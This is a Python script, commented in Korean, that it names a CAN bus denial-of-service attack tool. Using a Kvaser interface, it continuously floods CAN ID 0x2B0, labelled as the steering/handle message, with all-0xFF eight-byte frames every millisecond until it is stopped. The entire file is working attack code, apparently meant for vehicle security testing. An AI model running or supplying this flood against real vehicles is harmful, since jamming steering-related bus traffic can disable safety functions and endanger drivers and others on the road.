#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CAN Bus DoS 공격 도구 - 
Kvaser CAN 인터페이스를 사용하여 ID 0x2B0(핸들)로 메시지를 지속적으로 전송

BSD 2-Clause License
Copyright (c) 2021, Uwe Vogt, UV Software
All rights reserved.

원본 저작물: https://github.com/mac-can/KvaserCAN-Library
이 파일은 원본 코드를 기반으로 수정되었습니다.
"""

from kvaser_can import KvaserCAN
import time
import os
import sys


def main():
    # DoS 공격 설정값 (can_test 명령어와 비슷한 파라미터)
    CHANNEL = 0           # CAN 채널 번호
    TRANSMIT = 9999999    # 전송할 메시지 개수 (거의 무한)
    CYCLE = 0.001         # 메시지 전송 주기 (초) - 1ms
    ID = 0x2B0            # CAN 메시지 ID
    DLC = 8               # 데이터 길이
    BAUDRATE = -2         # 비트레이트 인덱스 (-2 = 500kbit/s)
    
    print("===== CAN Bus DoS 공격 도구 =====")
    print(f"채널: {CHANNEL}")
    print(f"전송 개수: {TRANSMIT}")
    print(f"전송 주기: {CYCLE}초")
    print(f"메시지 ID: 0x{ID:X}")
    print(f"데이터 길이: {DLC}")
    print(f"비트레이트: 500kbit/s")
    
    # KvaserCAN 인스턴스 생성
    can = KvaserCAN()
    
    # 사용 가능한 채널 확인
    channels = can.scan_channels()
    if not channels:
        print("오류: 사용 가능한 CAN 채널이 없습니다.")
        return 1
    
    if CHANNEL not in channels:
        print(f"경고: 채널 {CHANNEL}이 감지되지 않았습니다. 사용 가능한 채널: {channels}")
        print(f"첫 번째 사용 가능한 채널 {channels[0]}을 대신 사용합니다.")
        CHANNEL = channels[0]
    
    # 채널 열기
    print(f"\n채널 {CHANNEL} 초기화 중...")
    result = can.open(channel=CHANNEL)
    if result < 0:
        print(f"오류: 채널 열기 실패 (코드: {result})")
        return 1
    
    # CAN 컨트롤러 시작
    print("CAN 컨트롤러 시작 중...")
    result = can.start(bitrate_index=BAUDRATE)
    if result < 0:
        print(f"오류: CAN 컨트롤러 시작 실패 (코드: {result})")
        can.close()
        return 1
    
    # DoS 공격 데이터 준비
    data = [0xFF] * DLC  # 모든 비트를 1로 채운 최대 길이 데이터
    
    print("\n==================================")
    print(f"DoS 공격 시작: ID 0x{ID:X}로 지속 송신")
    print("==================================")
    print("종료하려면 Ctrl+C를 누르세요...")
    
    try:
        count = 0
        start_time = time.time()
        
        # 지정된 개수만큼 메시지 전송
        while count < TRANSMIT:
            # 메시지 송신
            result = can.send(msg_id=ID, data=data)
            
            if result < 0:
                print(f"\n오류: 메시지 송신 실패 (코드: {result})")
                break
            
            count += 1
            
            # 매 1000개 메시지마다 상태 표시
            if count % 1000 == 0:
                elapsed = time.time() - start_time
                rate = count / elapsed if elapsed > 0 else 0
                print(f"\r전송 중: {count}개 메시지 ({rate:.2f} msg/s)", end="")
                sys.stdout.flush()
            
            # 지정된 주기만큼 대기
            time.sleep(CYCLE)
    
    except KeyboardInterrupt:
        print("\n\n사용자에 의해 중단됨")
    
    finally:
        # 통계 출력
        elapsed = time.time() - start_time
        rate = count / elapsed if elapsed > 0 else 0
        
        print("\n\n==================================")
        print("DoS 공격 완료")
        print(f"총 전송 메시지: {count}개")
        print(f"소요 시간: {elapsed:.2f}초")
        print(f"전송 속도: {rate:.2f} msg/s")
        print("==================================")
        
        # 항상 채널 닫기
        print("CAN 채널 닫는 중...")
        can.close()
    
    return 0


if __name__ == "__main__":
    exit(main())
